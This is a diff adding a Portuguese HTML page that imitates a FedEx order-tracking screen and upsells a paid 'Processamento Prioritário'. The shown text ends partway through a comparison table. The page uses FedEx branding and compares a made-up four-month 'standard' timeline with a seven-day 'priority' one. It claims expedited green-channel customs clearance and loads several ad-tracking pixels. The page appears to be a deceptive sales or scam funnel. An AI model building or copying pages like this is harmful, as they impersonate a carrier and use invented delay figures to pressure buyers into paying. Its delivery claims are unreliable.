@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="/js/pix-netlify.js"></script>
+<!-- Microsoft Clarity Code Start -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yevctx4wrr");
+</script>
+<!-- Microsoft Clarity Code End -->
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+<!-- Spotify Pixel Code Start -->
+<script>
+  (function(w, d){
+    var id='spdt-capture', n='script';
+    if (!d.getElementById(id)) {
+      w.spdt = w.spdt || function() { (w.spdt.q = w.spdt.q || []).push(arguments); };
+      var e = d.createElement(n); e.id = id; e.async=1;
+      e.src = 'https://pixel.byspotify.com/ping.min.js';
+      var s = d.getElementsByTagName(n)[0]; s.parentNode.insertBefore(e, s);
+    }
+    w.spdt('conf', { key: 'b2d850e2d437439d8f7ed7f0a10968f0' });
+    w.spdt('view');
+  })(window, document);
+</script>
+<!-- Spotify Pixel Code End -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Rastreamento do Pedido - Processamento Prioritário</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+    body { background: #f4f6f9; color: #1a1a2e; font-size: 14px; line-height: 1.5; }
+
+    .wrapper { max-width: 480px; margin: 0 auto; min-height: 100vh; background: #ffffff; display: flex; flex-direction: column; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+
+    /* ── HEADER FEDEX ── */
+    .fedex-header {
+      background: #ffffff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    .fedex-header-left {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 2px;
+    }
+    .fedex-logo-img { height: 26px; width: auto; object-fit: contain; display: block; }
+    .fedex-service-tag {
+      background: #FF6200;
+      color: #fff;
+      font-size: 9px;
+      font-weight: 800;
+      padding: 2px 7px;
+      border-radius: 3px;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+    }
+    .fedex-subtitle {
+      font-size: 10px;
+      color: #64748b;
+      letter-spacing: 0.3px;
+    }
+
+    /* ── HERO SUCCESS ── */
+    .hero-success {
+      background: linear-gradient(135deg, #0f5132, #146c43);
+      padding: 24px 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-success::before {
+      content: '';
+      position: absolute;
+      top: -30px; right: -30px;
+      width: 120px; height: 120px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 50%;
+    }
+    .hero-row { display: flex; align-items: flex-start; gap: 14px; position: relative; z-index: 1; }
+    .hero-check {
+      width: 44px; height: 44px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      border: 2.5px solid rgba(255,255,255,0.35);
+    }
+    .hero-check svg { width: 22px; height: 22px; }
+    .hero-text { flex: 1; }
+    .hero-title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #fff;
+      line-height: 1.25;
+      margin-bottom: 4px;
+      letter-spacing: -0.3px;
+    }
+    .hero-sub {
+      font-size: 12px;
+      color: rgba(255,255,255,0.8);
+      line-height: 1.45;
+    }
+
+    /* ── SECTION TITLE ── */
+    .status-section { padding: 20px 16px 8px; }
+    .status-label { font-size: 12px; font-weight: 800; color: #475569; text-transform: uppercase; letter-spacing: 0.6px; }
+
+    /* ── TIMELINE CARD ── */
+    .timeline-card {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 14px;
+      margin: 0 16px 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+    }
+    .timeline-card.priority-highlight {
+      background: #fdfdfd;
+      border: 2px solid #198754;
+      box-shadow: 0 4px 16px rgba(25, 135, 84, 0.08);
+    }
+    .timeline-card-header {
+      padding: 12px 16px;
+      background: #f8fafc;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .timeline-card.priority-highlight .timeline-card-header {
+      background: #f0fdf4;
+      border-bottom-color: #d1fae5;
+    }
+    .timeline-card-title { font-size: 12px; font-weight: 800; color: #1e293b; }
+    .timeline-card-title.priority-text { color: #198754; display: flex; align-items: center; gap: 4px; }
+    .timeline-card-subtitle { font-size: 11px; color: #64748b; font-weight: 600; }
+
+    /* TIMELINE STEPS */
+    .timeline-body { padding: 16px; }
+    .tl-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      position: relative;
+      padding-bottom: 16px;
+    }
+    .tl-step:last-child { padding-bottom: 0; }
+    .tl-step:last-child .tl-line { display: none; }
+
+    .tl-icon-wrap {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .tl-dot {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+    }
+    .tl-dot.done { background: #d1fae5; border: 2px solid #10b981; }
+    .tl-dot.waiting { background: #fff; border: 2px solid #cbd5e1; color: #64748b; }
+    .tl-dot.warning { background: #fef3c7; border: 2px solid #f59e0b; }
+    
+    .tl-dot-svg { width: 14px; height: 14px; }
+
+    .tl-line {
+      width: 2px;
+      flex: 1;
+      min-height: 24px;
+      margin-top: 2px;
+    }
+    .tl-line.done-line { background: #10b981; }
+    .tl-line.grey-line { background: #cbd5e1; }
+    .tl-line.warning-line { background: linear-gradient(to bottom, #f59e0b, #cbd5e1); }
+
+    .tl-content { flex: 1; padding-top: 2px; }
+    .tl-name { font-size: 13px; font-weight: 600; color: #1e293b; }
+    .tl-name.grey { color: #94a3b8; }
+    .tl-time {
+      font-size: 10px;
+      font-weight: 700;
+      margin-top: 3px;
+      padding: 2px 8px;
+      border-radius: 10px;
+      display: inline-block;
+    }
+    .tl-time.red { background: #fee2e2; color: #dc2626; }
+    .tl-time.green { background: #d1fae5; color: #15803d; }
+    .tl-time.grey-tag { background: #f1f5f9; color: #64748b; }
+    .tl-time.done-tag { background: #d1fae5; color: #15803d; }
+    .tl-note { font-size: 11px; color: #64748b; margin-top: 3px; line-height: 1.4; }
+
+    /* TOTAL ROW */
+    .tl-total {
+      margin-top: 14px;
+      padding: 12px 14px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .tl-total.red-bg { background: #fff5f5; border: 1.5px solid #fee2e2; }
+    .tl-total.green-bg { background: #f0fdf4; border: 1.5px solid #d1fae5; }
+    .tl-total-label { font-size: 12px; font-weight: 600; color: #475569; }
+    .tl-total-value { font-size: 15px; font-weight: 800; }
+    .tl-total-value.red { color: #dc2626; }
+    .tl-total-value.green { color: #15803d; }
+
+    /* ── INFO BOX FEDEX ── */
+    .fedex-info-card {
+      margin: 4px 16px 16px;
+      padding: 14px 16px;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      font-size: 12px;
+      color: #475569;
+      line-height: 1.5;
+    }
+
+    /* ── PRIORITY CARD ── */
+    .priority-card {
+      margin: 4px 16px 16px;
+      background: linear-gradient(135deg, #1e40af, #1d4ed8);
+      border-radius: 14px;
+      padding: 18px;
+      box-shadow: 0 4px 16px rgba(30,64,175,0.2);
+      position: relative;
+      overflow: hidden;
+    }
+    .priority-card-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+    .priority-card-desc {
+      font-size: 12px;
+      color: rgba(255,255,255,0.85);
+      line-height: 1.6;
+    }
+
+    /* ── COMPARISON TABLE ── */
+    .compare-section { margin: 0 16px 16px; }
+    .compare-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .compare-col {
+      background: #fff;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 14px 12px;
+    }
+    .compare-col.priority-col {
+      background: #f0fdf4;
+      border: 2px solid #22c55e;
+    }
+    .compare-col-header {
+      font-size: 11px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 10px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    .compare-col.priority-col .compare-col-header {
+      color: #15803d;
+      border-bottom-color: #bbf7d0;
+    }
+    .compare-col:not(.priority-col) .compare-col-header { color: #94a3b8; }
+
+    .compare-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 6px;
+      margin-bottom: 8px;
+      font-size: 11px;
+      line-height: 1.4;
+    }
+    .compare-item:last-child { margin-bottom: 0; }
+    .compare-icon { width: 14px; height: 14px; flex-shrink: 0; margin-top: 1px; }
+    .compare-text { color: #475569; }
+    .compare-col.priority-col .compare-text { color: #14532d; font-weight: 600; }
+
+    /* ── URGENCY BOX ── */
+    .urgency-box {
+      margin: 0 16px 20px;
+      background: #fff7ed;
+      border: 1.5px solid #fed7aa;
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .urgency-icon-wrap {
+      width: 24px; height: 24px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .urgency-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: #c2410c;
+      margin-bottom: 4px;
+    }
+    .urgency-text {
+      font-size: 12px;
+      color: #7c3404;
+      line-height: 1.5;
+    }
+
+    /* ── PRICE CARD ── */
+    .price-card {
+      margin: 0 16px 16px;
+      background: #fff;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .price-info .price-label { font-size: 11px; color: #64748b; font-weight: 700; text-transform: uppercase; }
+    .price-value { font-size: 26px; font-weight: 900; color: #16a34a; }
+    .price-value small { font-size: 14px; }
+    .price-badges { display: flex; gap: 6px; margin-top: 6px; }
+    .price-badge { font-size: 9px; font-weight: 700; padding: 2px 7px; border-radius: 10px; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
+
+    /* ── BUTTON ── */
+    .btn-wrap { padding: 0 16px 32px; }
+    .btn-priority {
+      width: 100%;
+      background: #198754;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 18px 20px;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      text-align: center;
+      transition: transform 0.15s, background-color 0.15s;
+      box-shadow: 0 4px 14px rgba(25,135,84,0.3);
+      letter-spacing: 0.3px;
+      outline: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-priority:active { transform: scale(0.98); }
+    .btn-priority:disabled { background: #a3cfbb; cursor: not-allowed; box-shadow: none; }
+    .btn-sub-text {
+      text-align: center;
+      font-size: 11px;
+      color: #94a3b8;
+      margin-top: 10px;
+    }
+
+    /* ── MODAL ── */
+    .modal-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none; align-items: center; justify-content: center;
+      z-index: 1000; padding: 24px;
+    }
+    .modal-box {
+      background: #fff; border-radius: 16px; padding: 24px;
+      width: 100%; max-width: 400px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+      animation: popIn 0.25s ease-out;
+      display: flex; flex-direction: column; align-items: center;
+    }
+    @keyframes popIn {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .modal-icon-wrap {
+      width: 40px; height: 40px;
+      background: #f0fdf4;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 12px;
+      color: #198754;
+    }
+    .modal-title { font-size: 16px; font-weight: 800; color: #1e293b; margin-bottom: 4px; text-align: center; }
+    .modal-sub { font-size: 12px; color: #64748b; text-align: center; margin-bottom: 20px; line-height: 1.5; }
+    .progress-bar { width: 100%; height: 6px; background: #e2e8f0; border-radius: 3px; overflow: hidden; }
+    .progress-fill { height: 100%; background: #198754; border-radius: 3px; transition: width 0.12s linear; width: 0%; }
+
+    /* SECURITY STRIP */
+    .security-strip {
+      margin: 0 16px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .sec-item {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 10px; color: #94a3b8; font-weight: 500;
+    }
+    .sec-item svg { flex-shrink: 0; }
+  </style>
+</head>
+<body>
+<div class="wrapper">
+
+  <!-- HEADER FEDEX (Logo FedEx no canto superior direito) -->
+  <header class="fedex-header">
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+    <div class="fedex-header-left">
+      <span class="fedex-service-tag">International Priority</span>
+      <span class="fedex-subtitle">Rastreamento em tempo real</span>
+    </div>
+    <img class="fedex-logo-img" src="/logofedex/image.png" alt="FedEx">
+  </header>
+
+  <!-- HERO SUCCESS (Sem emojis e sem número de rastreio) -->
+  <div class="hero-success">
+    <div class="hero-row">
+      <div class="hero-check">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <div class="hero-text">
+        <div class="hero-title">Seu pedido foi confirmado com sucesso!</div>
+        <div class="hero-sub">Importação internacional iniciada. Veja abaixo os fluxos logísticos de entrega disponíveis para a sua remessa.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- STATUS SECTION -->
+  <div class="status-section">
+    <div class="status-label">Status atual do pedido</div>
+  </div>
+
+  <!-- FEDEX INFORMATION CARD -->
+  <div class="fedex-info-card">
+    Como parceira logística oficial para remessas internacionais, a FedEx oferece o serviço Priority com garantia de entrega expressa através de desembaraço aduaneiro simplificado (canal verde), reduzindo drasticamente os prazos convencionais de trânsito internacional.
+  </div>
+
+  <!-- TIMELINE 1: FLUXO PADRÃO -->
+  <div class="timeline-card">
+    <div class="timeline-card-header">
+      <div class="timeline-card-title">Fluxo de Envio Padrão</div>
+      <div class="timeline-card-subtitle">Sem Prioridade</div>
+    </div>
+    <div class="timeline-body">
+      
+      <!-- 1. Pedido confirmado -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Pedido confirmado</div>
+          <span class="tl-time done-tag">Concluído</span>
+        </div>
+      </div>
+
+      <!-- 2. Preparação logística -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot warning">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line warning-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Preparação logística</div>
+          <span class="tl-time red">15 a 20 dias</span>
+          <div class="tl-note">Aguardando na fila operacional</div>
+        </div>
+      </div>
+
+      <!-- 3. Processamento da remessa -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line grey-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Processamento da remessa</div>
+          <span class="tl-time red">20 a 25 dias</span>
+          <div class="tl-note">Emissão de documentos aduaneiros</div>
+        </div>
+      </div>
+
+      <!-- 4. Despacho internacional -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line grey-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Despacho internacional</div>
+          <span class="tl-time red">10 a 15 dias</span>
+          <div class="tl-note">Transporte aéreo EUA para Brasil</div>
+        </div>
+      </div>
+
+      <!-- 5. Entrada no país de destino -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line grey-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Entrada no país de destino</div>
+          <span class="tl-time red">45 a 60 dias</span>
+          <div class="tl-note">Inspeção e liberação alfandegária</div>
+        </div>
+      </div>
+
+      <!-- 6. Transporte nacional -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line grey-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Transporte nacional</div>
+          <span class="tl-time red">25 a 30 dias</span>
+          <div class="tl-note">Distribuição interna no Brasil</div>
+        </div>
+      </div>
+
+      <!-- 7. Saiu para entrega -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="tl-line grey-line" style="height: 44px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Saiu para entrega</div>
+          <span class="tl-time red">3 a 5 dias</span>
+        </div>
+      </div>
+
+      <!-- 8. Entregue -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot waiting">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name grey">Entregue</div>
+          <span class="tl-time grey-tag">Estimativa padrão</span>
+        </div>
+      </div>
+
+      <div class="tl-total red-bg">
+        <span class="tl-total-label">Tempo total estimado</span>
+        <span class="tl-total-value red">4 meses</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- TIMELINE 2: FLUXO PRIORITÁRIO (Logo abaixo da padrão) -->
+  <div class="timeline-card priority-highlight">
+    <div class="timeline-card-header">
+      <div class="timeline-card-title priority-text">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+        Fluxo Prioritário FedEx
+      </div>
+      <div class="timeline-card-subtitle" style="color: #15803d;">Recomendado</div>
+    </div>
+    <div class="timeline-body">
+
+      <!-- 1. Pedido confirmado -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Pedido confirmado</div>
+          <span class="tl-time done-tag">Concluído</span>
+        </div>
+      </div>
+
+      <!-- 2. Preparação logística -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Preparação logística</div>
+          <span class="tl-time green">Dia 1</span>
+          <div class="tl-note" style="color:#15803d;">Atendimento imediato e preferencial</div>
+        </div>
+      </div>
+
+      <!-- 3. Processamento da remessa -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Processamento da remessa</div>
+          <span class="tl-time green">Dia 2</span>
+          <div class="tl-note" style="color:#15803d;">Documentação prioritária pré-aprovada</div>
+        </div>
+      </div>
+
+      <!-- 4. Despacho internacional -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Despacho internacional</div>
+          <span class="tl-time green">Dia 3</span>
+          <div class="tl-note" style="color:#15803d;">Próximo voo internacional disponível</div>
+        </div>
+      </div>
+
+      <!-- 5. Entrada no país de destino -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Entrada no país de destino</div>
+          <span class="tl-time green">Dias 4 e 5</span>
+          <div class="tl-note" style="color:#15803d;">Liberação aduaneira expressa (canal verde)</div>
+        </div>
+      </div>
+
+      <!-- 6. Transporte nacional -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Transporte nacional</div>
+          <span class="tl-time green">Dia 6</span>
+          <div class="tl-note" style="color:#15803d;">Distribuição expressa final da transportadora</div>
+        </div>
+      </div>
+
+      <!-- 7. Saiu para entrega -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="tl-line done-line" style="height: 40px;"></div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name">Saiu para entrega</div>
+          <span class="tl-time green">Dia 7</span>
+        </div>
+      </div>
+
+      <!-- 8. Entregue -->
+      <div class="tl-step">
+        <div class="tl-icon-wrap">
+          <div class="tl-dot done">
+            <svg class="tl-dot-svg" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+        </div>
+        <div class="tl-content">
+          <div class="tl-name" style="color:#15803d;font-weight:700;">Entregue no endereço de destino</div>
+          <span class="tl-time green">Dia 7</span>
+        </div>
+      </div>
+
+      <div class="tl-total green-bg">
+        <span class="tl-total-label">Tempo total prioritário</span>
+        <span class="tl-total-value green">7 dias</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- PRIORITY CARD -->
+  <div class="priority-card">
+    <div class="priority-card-title">Ative o Processamento Prioritário</div>
+    <div class="priority-card-desc">
+      Seu pedido já foi confirmado e encontra-se aguardando a próxima etapa operacional. Ao ativar o Processamento Prioritário, sua remessa recebe preferência operacional durante a preparação e o despacho, reduzindo o tempo de espera antes do envio de <strong>cerca de 4 meses para apenas 7 dias</strong>.
+    </div>
+  </div>
+
+  <!-- COMPARISON TABLE (Sem emojis) -->
+  <div class="compare-section">
+    <div class="compare-grid">
+      <div class="compare-col">
+        <div class="compare-col-header">Fluxo Padrão</div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          <span class="compare-text">Processamento convencional</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          <span class="compare-text">Aguarda ordem operacional</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          <span class="compare-text">Despacho conforme disponibilidade</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          <span class="compare-text">Cerca de 4 meses para entrega</span>
+        </div>
+      </div>
+      <div class="compare-col priority-col">
+        <div class="compare-col-header">Prioritário</div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
